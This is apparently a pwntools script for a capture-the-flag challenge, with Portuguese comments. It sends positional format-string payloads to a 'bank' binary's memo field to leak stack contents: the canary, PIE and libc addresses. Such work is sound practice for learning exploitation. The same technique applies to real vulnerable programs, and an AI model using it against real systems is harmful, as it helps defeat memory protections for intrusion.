#!/usr/bin/env python3
from pwn import *

# Desativa logs muito verbosos do pwntools.
context.log_level = "error"

# Arquivos fornecidos pelo desafio.
BIN = "./bank"
LD = "./ld-linux-x86-64.so.2"
LIBC_DIR = "."

def start_process():
    """
    Inicia o binário usando o loader e a libc fornecidos no ZIP.
    Isso aproxima o ambiente local do ambiente remoto.
    """
    return process([LD, "--library-path", LIBC_DIR, BIN])

def leak_positions(start, end):
    """
    Envia uma sequência de format strings posicionais:
    %1$p, %2$p, %3$p...

    O objetivo é mapear quais posições da stack contêm:
    - stack canary
    - retorno para o binário PIE
    - retorno/endereço da libc
    - ponteiros úteis
    """
    p = start_process()

    # Aguarda o menu principal.
    p.recvuntil(b"> ")

    # Escolhe a opção 1: Check Balance.
    p.sendline(b"1")

    # Aguarda o campo vulnerável.
    p.recvuntil(b"Enter account memo: ")

    # Monta payload curto para caber no limite de 127 bytes.
    payload = b"|".join([f"%{i}$p".encode() for i in range(start, end + 1)])

    print("=" * 100)
    print(f"POSICOES {start} até {end}")
    print("=" * 100)
    print("[*] Payload:", payload.decode())

    # Envia payload de format string.
    p.sendline(payload)

    # Lê a resposta até o próximo menu ou até timeout.
    output = p.recv(timeout=2)

    try:
        print(output.decode(errors="replace"))
    except Exception:
        print(repr(output))

    p.close()

def main():
    # Testa posições em blocos para não passar de 127 bytes.
    for start in range(1, 61, 8):
        end = start + 7
        leak_positions(start, end)

if __name__ == "__main__":
    main()
